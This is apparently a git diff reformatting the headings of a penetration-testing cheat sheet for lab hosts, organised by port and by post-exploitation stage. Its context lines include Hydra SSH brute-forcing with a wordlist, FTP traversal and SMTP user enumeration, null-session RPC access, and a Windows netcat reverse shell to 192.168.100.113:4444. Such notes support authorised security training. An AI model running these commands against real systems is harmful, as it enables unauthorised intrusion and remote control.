@@ -4,7 +4,7 @@ Main Nmap Scan: nmap -v -A -sS 10.11.1.X
 Alternate Connect Scan: nmap -v -sT -p 0-10000 10.11.1.X
 
 # Ports and Services:
-# 21: FTP
+## 21: FTP
 		
 Methods and Tools:
 Notes:
@@ -17,7 +17,7 @@ nmap -v 10.11.1.X --script “ftp*”
 dotdotpwn
 dotdotpwn -h 10.11.1.X -m ftp
 
-# 22: SSH
+## 22: SSH
 
 Methods and Tools:
 Notes:
@@ -27,7 +27,7 @@ hydra
 Hydra -l user -P /usr/share/wordlists/rockyou.gz 10.11.1.X SSH
 
 
-# 25: SMTP
+## 25: SMTP
 
 Methods and Tools:
 Notes: 
@@ -39,7 +39,7 @@ smtp-user-enum
 smtp-user-enum -u username -U usernamelist.txt -t 10.11.1.X
 
 
-# 53: DNS
+## 53: DNS
 	
 Methods and Tools:
 Notes:
@@ -51,7 +51,7 @@ DNSenum
 dnsenum URL.com
 
 
-# 80/443/8080: HTTP/HTTPS
+## 80/443/8080: HTTP/HTTPS
 
 Methods and Tools:
 Notes:
@@ -73,7 +73,7 @@ Wpscan
 Only for wordpress
 
 
-# 110: POP3
+## 110: POP3
 	
 Methods and Tools:
 Notes:
@@ -85,10 +85,7 @@ Netcat/telnet interaction
 nc 10.11.1.X 110
 
 
-
-
-
-# 135: RPC
+## 135: RPC
 	
 Methods and Tools:
 Notes:
@@ -102,7 +99,7 @@ rpcclient
 rpcclient -U “” 10.11.1.X for null session
 
 	
-# 139: NETBIOS
+## 139: NETBIOS
 	
 Methods and Tools:
 Notes:
@@ -114,7 +111,7 @@ enum4linux
 enum4linux 10.11.1.X
 
 
-# 445: SMB
+## 445: SMB
 	
 Methods and Tools:
 Notes:
@@ -134,7 +131,7 @@ nbtscan -v 10.11.1.X
 
 
 
-## Windows Post-Exploitation
+# Windows Post-Exploitation
 	
 General Toolkit
 Method and Tools:
@@ -153,7 +150,7 @@ Windows netcat reverse shell
 nc.exe 192.168.100.113 4444 –e cmd.exe
 
 
-# Privilege Escalation
+## Privilege Escalation
 	
 Method and Tools:
 Notes and Links:
@@ -178,7 +175,7 @@ net start upnphost
 
 
 
-## Linux Post-Exploitation
+# Linux Post-Exploitation
 
 General Toolkit:
 Method and Tools:
@@ -196,7 +193,7 @@ Set LHOST
 Set EXITFUNC
 
 
-# Privilege Escalation:
+## Privilege Escalation:
 
 Method and Tools:
 Notes and Links:
